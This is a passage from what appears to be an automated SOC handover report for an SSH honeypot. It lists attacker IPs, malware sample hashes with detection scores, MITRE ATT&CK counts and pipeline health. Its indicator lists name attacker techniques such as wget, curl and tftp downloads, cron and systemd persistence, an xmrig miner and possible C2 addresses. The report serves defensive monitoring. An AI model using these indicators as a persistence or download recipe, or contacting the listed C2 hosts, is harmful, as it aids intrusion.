| `77.239.124[.]252` | 1 | 2026-11-24 06:21 | 2026-11-24 06:21 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-24 02:53 | 2026-11-24 02:53 | 6s | 0 | `T1592` | 🟢 LOW |
| `8.243.73[.]199` | 1 | 2026-11-24 00:29 | 2026-11-24 00:30 | 44s | 0 | `T1592` | 🟢 LOW |
| `82.137.203[.]123` | 1 | 2026-11-24 03:13 | 2026-11-24 03:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.40.59[.]147` | 1 | 2026-11-24 02:38 | 2026-11-24 02:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.248.250[.]143` | 1 | 2026-11-24 00:34 | 2026-11-24 00:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.166.212[.]96` | 1 | 2026-11-24 05:16 | 2026-11-24 05:16 | 12s | 0 | `T1592` | 🟢 LOW |
| `91.225.171[.]242` | 1 | 2026-11-24 03:14 | 2026-11-24 03:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]78` | 1 | 2026-11-24 01:21 | 2026-11-24 01:22 | 9s | 0 | `T1592` | 🟢 LOW |
| `93.173.213[.]232` | 1 | 2026-11-24 00:41 | 2026-11-24 00:41 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `200.89.159[.]59` | AR | Telecom Argentina S.A. | **100** ⚠️ | 50 |
| `207.219.221[.]101` | CA | TELUS Communications Inc. | **100** ⚠️ | 50 |
| `83.209.249[.]224` | SE | Bredband2 AB | **100** ⚠️ | 12 |
| `106.4.8[.]127` | CN | CHINANET JIANGXI PROVINCE NETWORK | **100** ⚠️ | 0 |
| `121.131.220[.]140` | KR | Korea Telecom | **100** ⚠️ | 1 |
| `125.86.25[.]198` | CN | CHINANET Chongqing province network | **100** ⚠️ | 8 |
| `46.44.0[.]185` | RU | LLC TRC FIORD | **100** ⚠️ | 50 |
| `58.211.39[.]86` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `58.245.210[.]70` | CN | China Unicom Jilin province network | **100** ⚠️ | 50 |
| `220.161.52[.]149` | CN | CHINANET Fujian province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 468 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 457 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 9 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (34 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 19 below threshold 25 | 3 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 575 cases |
| Tool 34  | Credential Extractor        | ✅ 946 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 22 fingerprints |
| Tool 36  | Command Clustering          | ✅ 14 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 497 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 34 filtered (5.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 150 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 450 priority case(s) shown individually · 83 recon entry/entries in table (4 group(s) consolidating 12 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-24T07:30:31Z_
